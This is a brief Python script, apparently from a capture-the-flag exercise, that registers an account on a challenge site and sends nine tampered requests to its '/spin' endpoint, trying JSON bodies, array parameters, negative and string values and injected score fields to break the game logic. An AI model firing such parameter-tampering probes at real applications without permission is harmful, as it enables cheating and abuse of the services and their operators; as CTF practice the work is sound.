import requests, sys

base = 'https://web-random-cheese.tracebash.xyz'
s = requests.Session()
s.post(f'{base}/register', data={'username':'hacker4000','password':'pass4000'}, allow_redirects=False)
s.post(f'{base}/login', data={'username':'hacker4000','password':'pass4000'}, allow_redirects=False)

# Try different content types and parameters
# 1. JSON with val=90
r = s.post(f'{base}/spin', json={'val': 90})
print('JSON val=90:', r.text)

# 2. JSON with score=1000
r = s.post(f'{base}/spin', json={'score': 1000})
print('JSON score=1000:', r.text)

# 3. Form with val[]=90
r = s.post(f'{base}/spin', data={'val[]': '90'})
print('Form val[]=90:', r.text)

# 4. Form with multiple vals
r = s.post(f'{base}/spin', data={'val': ['90', '100']})
print('Form val list:', r.text)

# 5. Form with score=85 and val=85
r = s.post(f'{base}/spin', data={'val': '85', 'score': '85'})
print('Both 85:', r.text)

# 6. Try negative val
r = s.post(f'{base}/spin', data={'val': '-100'})
print('val=-100:', r.text)

# 7. Try string val
r = s.post(f'{base}/spin', data={'val': 'ninety'})
print('val=ninety:', r.text)

# 8. Try array score
r = s.post(f'{base}/spin', data={'score[]': '85'})
print('score[]=85:', r.text)

# 9. Try JSON with score and val together
r = s.post(f'{base}/spin', json={'val': 100, 'score': 100})
print('JSON both 100:', r.text)